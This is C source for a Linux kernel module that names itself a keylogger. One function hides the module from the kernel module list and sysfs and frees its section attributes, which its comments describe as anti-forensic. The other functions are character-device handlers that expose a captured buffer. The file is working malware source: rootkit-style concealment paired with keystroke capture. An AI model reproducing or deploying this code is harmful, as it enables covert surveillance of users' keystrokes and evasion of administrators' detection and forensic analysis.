#include "./headers/fops.h"
int dev_open_fops_for_hide(struct inode *inode, struct file* file)
{
    static struct list_head *module_list;
    struct kobject* saved_kobj_parent;
    sysfs_remove_fir_orig = (void *)kallsyms_lookup_name("sysfs_remove_dir");
    sysfs_create_fir_orig = (void *) kallsyms_lookup_name("sysfs_create_dir_ns");
    if (!is_hide)
    {
        /*wait to get mutex*/
        while (!mutex_trylock(&module_mutex))
            cpu_relax();
        module_list = THIS_MODULE->list.prev;
        saved_kobj_parent = THIS_MODULE->mkobj.kobj.parent;
        list_del_init(&THIS_MODULE->list);//remove form the modules linked list
        sysfs_remove_fir_orig(&THIS_MODULE->mkobj.kobj);//remove the specific dir (not the object from the module)
        kobject_put(saved_kobj_parent);
        kfree(THIS_MODULE->sect_attrs);/*clean informasion for anti forensic*/
        kfree(THIS_MODULE->notes_attrs);/*using kfree to clean*/
        THIS_MODULE->notes_attrs = NULL;/* and then puts, NULL to seve the setings */
        THIS_MODULE->sect_attrs = NULL;/*things such as .bss, .text .code etc*/
        is_hide = 1;

        mutex_unlock(&module_mutex);
    }
    else
    {
        while (!mutex_trylock(&module_mutex))
            cpu_relax();
        list_add(&THIS_MODULE->list, module_list);
        kobject_get(saved_kobj_parent);
        sysfs_create_fir_orig(saved_kobj_parent);
        is_hide=0;
        
        mutex_unlock(&module_mutex);

    }
    
    return 0;    
}
int device_open(struct inode *inode, struct file * filp)
{
    //using mutex for allow only open process to use
    if (down_interruptible(&virtual_device.sem) != 0)
    {
        printk(KERN_ALERT "Keylogger: could not lock the device during open");
        return -1;
    }
    printk(KERN_INFO "Keylogger: opend device");
    return 0;
}

ssize_t device_write(struct file *flip, const char * buff_sorce_data, size_t buff_count, loff_t * offset)
{
    printk(KERN_INFO "Keylogger: writing to device");
    ret = copy_from_user(virtual_device.data, buff_sorce_data, buff_count);
    return ret;
}
int device_close(struct inode *inode, struct file *flip)
{
    //release the mutex
    up(&virtual_device.sem);
    printk(KERN_INFO "Keylogger: closed device");
    return 0;
} 
static ssize_t device_read(struct file *filp, char __user * buffer, size_t length, loff_t *offset)
{    
    return simple_read_from_buffer(buffer, length, offset, msg_Ptr, buf_pos);
}
